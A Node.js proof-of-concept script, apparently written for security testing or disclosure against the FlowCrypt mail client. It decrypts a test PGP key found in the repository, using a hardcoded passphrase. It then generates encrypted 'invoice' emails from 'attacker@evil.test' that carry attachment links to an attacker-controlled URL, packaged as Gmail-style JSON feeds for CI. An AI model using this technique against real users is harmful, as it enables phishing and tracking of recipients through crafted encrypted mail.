#!/usr/bin/env node
/**
 * Generator exported-message PoC v2 (F1/F2) di runner CI.
 * v2: attacker host = http://127.0.0.1:8002 (hit-server lokal), tanpa tunnel.
 * Pakai openpgp dari appium node_modules (sama dgn repo).
 *
 * Usage: node gen_feed_v2.js <attacker_base_url> <outdir> [runid]
 */
'use strict';
const fs = require('fs');
const path = require('path');

const OPENPGP = path.join(process.cwd(), 'node_modules', 'openpgp');
const EKM_TS = path.join(process.cwd(), 'api-mocks', 'apis', 'ekm', 'ekm-endpoints.ts');

(async () => {
  const openpgp = require(OPENPGP);
  const base = process.argv[2];
  const outdir = process.argv[3];
  const runid = process.argv[4] || String(Date.now());
  if (!base || !outdir) {
    console.error('usage: node gen_feed_v2.js <attacker_base_url> <outdir> [runid]');
    process.exit(2);
  }

  // e2e private key dari repo (sumber kebenaran yang sama dgn EKM mock)
  const src = fs.readFileSync(EKM_TS, 'utf8');
  const m = src.match(/e2e:\s*\{[\s\S]*?prv: \`(-----BEGIN PGP PRIVATE KEY BLOCK[\s\S]*?)\`/);
  if (!m) throw new Error('e2e prv tidak ditemukan di ekm-endpoints.ts');
  let prv = await openpgp.readPrivateKey({ armoredKey: m[1] });
  if (!prv.isDecrypted()) {
    prv = await openpgp.decryptKey({ privateKey: prv, passphrase: 'London blueBARREY capi' });
  }
  const pub = prv.toPublic();

  const b64url = (s) => Buffer.from(s, 'utf8').toString('base64').replace(/\+/g, '-').replace(/\//g, '_');
  const cryptupData = b64url(JSON.stringify({ name: 'invoice.pdf.pgp', type: 'application/octet-stream', size: 4096 }));

  const build = async (label, urlPath) => {
    const url = `${base.replace(/\/$/, '')}/${urlPath}`;
    const plaintext =
      `Hi, please find the attached invoice.\n\n` +
      `<a href="${url}" class="cryptup_file" cryptup-data="${cryptupData}">invoice.pdf.pgp</a>\n`;
    const msg = await openpgp.createMessage({ text: plaintext });
    const enc = await openpgp.encrypt({ message: msg, encryptionKeys: [pub], format: 'armored' });

    // self-test: decrypt balik
    const rd = await openpgp.decrypt({
      message: await openpgp.readMessage({ armoredMessage: enc }),
      decryptionKeys: [prv],
    });
    if (!rd.data.includes(url)) throw new Error('self-decrypt gagal: url tidak cocok');

    const subject = `POC attachment link ${label}`;
    const msgid = `18f1a2b3c4d5${String(Math.floor(Math.random() * 1e8)).padStart(8, '0')}`;
    const mimeHeaders =
      'Content-Type: text/plain; charset="UTF-8"\r\n' +
      'Content-Transfer-Encoding: 7bit\r\n' +
      `Message-ID: <${msgid}@flowcrypt.com>\r\n` +
      'MIME-Version: 1.0\r\n' +
      `From: Attacker <attacker@evil.test>\r\n` +
      'To: e2e enterprise tests <e2e.enterprise.test@flowcrypt.com>\r\n' +
      `Subject: ${subject}\r\n` +
      'Date: Thu, 1 Oct 2026 12:00:00 +0000\r\n\r\n';
    const mime = mimeHeaders + enc + '\r\n';
    const rawB64 = Buffer.from(mime, 'utf8').toString('base64');

    return {
      acctEmail: 'e2e.enterprise.test@flowcrypt.com',
      full: {
        id: msgid,
        threadId: msgid,
        labelIds: ['CATEGORY_PERSONAL', 'INBOX'],
        snippet: plaintext.replace(/\n/g, ' ').slice(0, 60),
        payload: {
          partId: '',
          mimeType: 'text/plain',
          filename: '',
          headers: [
            { name: 'Content-Type', value: 'text/plain; charset="UTF-8"' },
            { name: 'Message-ID', value: `<${msgid}@flowcrypt.com>` },
            { name: 'MIME-Version', value: '1.0' },
            { name: 'From', value: 'Attacker <attacker@evil.test>' },
            { name: 'To', value: 'e2e enterprise tests <e2e.enterprise.test@flowcrypt.com>' },
            { name: 'Subject', value: subject },
            { name: 'Date', value: 'Thu, 1 Oct 2026 12:00:00 +0000' },
          ],
          body: { attachmentId: '', size: String(enc.length), data: Buffer.from(enc).toString('base64') },
          parts: [],
        },
        sizeEstimate: mime.length,
        raw: rawB64,
        historyId: '1',
        internalDate: '1790952000000',
      },
      raw: rawB64,
      attachments: [],
    };
  };

  const f1 = await build('F1', `open/FC-F1-${runid}`);
  const f2 = await build('F2', `open/FC-F2-${runid}`);
  const mode = process.argv[5] || 'all';
  if (mode === 'all' || mode === 'f1') {
    fs.writeFileSync(path.join(outdir, 'message-export-poc-f1.json'), JSON.stringify(f1, null, 1));
  }
  if (mode === 'all' || mode === 'f2') {
    fs.writeFileSync(path.join(outdir, 'message-export-poc-f2.json'), JSON.stringify(f2, null, 1));
  }
  fs.writeFileSync(
    path.join(outdir, 'feed-info.json'),
    JSON.stringify({ runid, base, mode, f1: f1.full.id, f2: f2.full.id }, null, 1),
  );
  console.log('feeds written: f1 =', f1.full.id, '| f2 =', f2.full.id);
})().catch(e => {
  console.error(e);
  process.exit(1);
});
